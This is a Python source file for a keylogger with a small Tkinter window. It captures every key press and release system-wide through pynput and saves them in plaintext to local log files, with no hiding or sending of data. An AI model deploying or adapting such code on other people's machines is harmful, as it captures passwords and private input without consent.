from pynput import keyboard
import json
import tkinter as tk
from tkinter import ttk

key_list = []
key_strokes = ""
listener = None

def update_txt_file(key_strokes):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key_strokes)

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global key_list, key_strokes
    key_list.append({'event': 'Pressed', 'key': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global key_list, key_strokes
    key_list.append({'event': 'Released', 'key': f'{key}'})
    update_json_file(key_list)
    key_strokes += str(key)
    update_txt_file(key_strokes)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)

def stop_keylogger():
    global listener
    listener.stop()
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

# Create the GUI window
window = tk.Tk()
window.title("Keylogger")
window.geometry("300x100")
window.configure(bg="#7464bc")

# Create style for buttons
style = ttk.Style()
style.configure("TButton",
                font=("Arial", 12),
                foreground="#b52b79",
                background="#b52b79",
                relief="flat",
                borderwidth=0,
                width=10)

# Create start button
start_button = ttk.Button(window, text="Start", command=start_keylogger)
start_button.pack(pady=10)

# Create stop button
stop_button = ttk.Button(window, text="Stop", command=stop_keylogger, state=tk.DISABLED)
stop_button.pack()

window.mainloop()
